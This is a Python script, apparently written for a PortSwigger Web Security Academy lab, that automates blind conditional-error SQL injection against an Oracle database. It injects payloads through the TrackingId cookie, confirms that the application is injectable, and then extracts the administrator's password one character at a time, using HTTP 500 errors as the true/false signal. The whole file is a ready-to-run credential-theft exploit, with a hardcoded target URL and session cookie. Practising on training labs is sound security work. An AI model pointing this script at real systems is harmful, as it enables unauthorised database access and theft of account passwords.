#!/usr/bin/env python3
"""
Blind SQL Injection Password Brute Force Script - Conditional Error Based
Automates password extraction using conditional database errors
ORACLE DATABASE
"""

import requests
import string
import sys
import time

# configuration
TARGET_URL = "https://0a850002042b16878094082200df00ba.web-security-academy.net/"
BASE_TRACKING_ID = "KgAkAX7WW3xh6SwY"
SESSION_COOKIE = "h8THf9ZNAOiOmb3aamX1wd3sJGOB6yRx"

# headers from your request
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Priority': 'u=0, i'
}


def test_condition_error(payload):
    """Test a SQL injection condition using Oracle conditional errors"""
    # oracle-specific conditional error payload
    error_payload = f"'||(SELECT CASE WHEN ({payload}) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
    tracking_id = f"{BASE_TRACKING_ID}{error_payload}"

    cookies = {
        'TrackingId': tracking_id,
        'session': SESSION_COOKIE
    }

    try:
        response = requests.get(
            TARGET_URL, headers=HEADERS, cookies=cookies, timeout=10)
        # if condition is true, we should get a 500 error (divide by zero)
        # if condition is false, we should get a 200 response
        return response.status_code == 500
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return False


def test_basic_error():
    """Test basic error-based injection"""
    # test single quote causes error
    tracking_id_single = f"{BASE_TRACKING_ID}'"
    # test double quote fixes error
    tracking_id_double = f"{BASE_TRACKING_ID}''"

    cookies_single = {
        'TrackingId': tracking_id_single,
        'session': SESSION_COOKIE
    }

    cookies_double = {
        'TrackingId': tracking_id_double,
        'session': SESSION_COOKIE
    }

    try:
        # single quote should cause error
        response_single = requests.get(
            TARGET_URL, headers=HEADERS, cookies=cookies_single, timeout=10)
        # double quote should not cause error
        response_double = requests.get(
            TARGET_URL, headers=HEADERS, cookies=cookies_double, timeout=10)

        return response_single.status_code == 500 and response_double.status_code == 200
    except requests.RequestException:
        return False


def get_password_length():
    """Determine the length of the administrator password"""
    print("Determining password length...")

    for length in range(1, 51):  # test up to 50 characters
        payload = f"LENGTH(password)={length}"
        # use Oracle-specific query structure
        error_payload = f"'||(SELECT CASE WHEN ({payload}) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        tracking_id = f"{BASE_TRACKING_ID}{error_payload}"

        cookies = {
            'TrackingId': tracking_id,
            'session': SESSION_COOKIE
        }

        try:
            response = requests.get(
                TARGET_URL, headers=HEADERS, cookies=cookies, timeout=10)
            if response.status_code == 500:
                print(f"Password length found: {length}")
                return length
        except requests.RequestException:
            continue

        time.sleep(0.1)  # small delay to avoid overwhelming the server

    print("Could not determine password length")
    return None


def extract_password_character_by_character(length):
    """Extract password character by character using Oracle conditional errors"""
    password = ""
    charset = string.ascii_lowercase + \
        string.ascii_uppercase + string.digits + "!@#$%^&*()_+-="

    print(
        f"Extracting {length}-character password using Oracle conditional errors...")

    for position in range(1, length + 1):
        print(f"Finding character {position}/{length}...", end="", flush=True)

        found = False
        for char in charset:
            # oracle-specific substring and conditional error
            payload = f"SUBSTR(password,{position},1)='{char}'"
            error_payload = f"'||(SELECT CASE WHEN ({payload}) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            tracking_id = f"{BASE_TRACKING_ID}{error_payload}"

            cookies = {
                'TrackingId': tracking_id,
                'session': SESSION_COOKIE
            }

            try:
                response = requests.get(
                    TARGET_URL, headers=HEADERS, cookies=cookies, timeout=10)
                if response.status_code == 500:
                    password += char
                    print(f" Found: '{char}'")
                    found = True
                    break
            except requests.RequestException:
                continue

            time.sleep(0.05)  # Small delay between requests

        if not found:
            print(f" Could not find character at position {position}")
            break

    return password


def main():
    print("Blind SQL Injection Password Extractor - Conditional Error Based")
    print("=" * 60)

    # test basic error injection
    print("Testing basic error-based SQL injection...")
    if not test_basic_error():
        print("❌ Basic error injection test failed!")
        print("The application might not be vulnerable to error-based injection.")
        sys.exit(1)
    print("✅ Error-based SQL injection confirmed!")

    # test if we can detect true/false conditions via errors
    print("Testing Oracle conditional error detection...")

    # test with simpler Oracle syntax - try different approaches
    test_approaches = [
        # approach 1: Standard Oracle with dual
        ("'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
         "'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"),

        # approach 2: Without TO_CHAR
        ("'||(SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END FROM dual)||'",
         "'||(SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END FROM dual)||'"),

        # approach 3: Direct concatenation
        ("'||CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END||'",
         "'||CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END||'")
    ]

    working_approach = None

    for i, (true_payload, false_payload) in enumerate(test_approaches, 1):
        print(f"  Trying approach {i}...")

        cookies_true = {
            'TrackingId': f"{BASE_TRACKING_ID}{true_payload}",
            'session': SESSION_COOKIE
        }

        cookies_false = {
            'TrackingId': f"{BASE_TRACKING_ID}{false_payload}",
            'session': SESSION_COOKIE
        }

        try:
            response_true = requests.get(
                TARGET_URL, headers=HEADERS, cookies=cookies_true, timeout=10)
            response_false = requests.get(
                TARGET_URL, headers=HEADERS, cookies=cookies_false, timeout=10)

            true_test = response_true.status_code == 500
            false_test = response_false.status_code == 200

            print(f"    True condition (1=1): {response_true.status_code}")
            print(f"    False condition (1=2): {response_false.status_code}")

            if true_test and false_test:
                print(f"  ✅ Approach {i} works!")
                working_approach = i
                break
            else:
                print(f"  ❌ Approach {i} failed")

        except requests.RequestException as e:
            print(f"  ❌ Approach {i} failed with error: {e}")
            continue

    if not working_approach:
        print("❌ No working conditional error approach found!")
        sys.exit(1)

    print("✅ Conditional error detection working!")

    # test if users table exists
    print("Testing if users table exists...")
    users_payload = f"'||(SELECT '' FROM users WHERE ROWNUM = 1)||'"
    cookies_users = {
        'TrackingId': f"{BASE_TRACKING_ID}{users_payload}",
        'session': SESSION_COOKIE
    }

    try:
        response_users = requests.get(
            TARGET_URL, headers=HEADERS, cookies=cookies_users, timeout=10)
        if response_users.status_code != 200:
            print("❌ Users table not accessible!")
            sys.exit(1)
    except requests.RequestException:
        print("❌ Users table test failed!")
        sys.exit(1)
    print("✅ Users table accessible!")

    # test if administrator user exists
    print("Testing if administrator user exists...")
    admin_payload = f"'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
    cookies_admin = {
        'TrackingId': f"{BASE_TRACKING_ID}{admin_payload}",
        'session': SESSION_COOKIE
    }

    try:
        response_admin = requests.get(
            TARGET_URL, headers=HEADERS, cookies=cookies_admin, timeout=10)
        if response_admin.status_code != 500:
            print("❌ Administrator user not found!")
            sys.exit(1)
    except requests.RequestException:
        print("❌ Administrator user test failed!")
        sys.exit(1)
    print("✅ Administrator user found!")

    # get password length
    length = get_password_length()
    if not length:
        sys.exit(1)

    # extract password character by character
    password = extract_password_character_by_character(length)

    print("\n" + "=" * 60)
    print(f"🎉 Password extracted: {password}")
    print(f"👤 Username: administrator")
    print(f"🔑 Password: {password}")
    print("=" * 60)


if __name__ == "__main__":
    main()
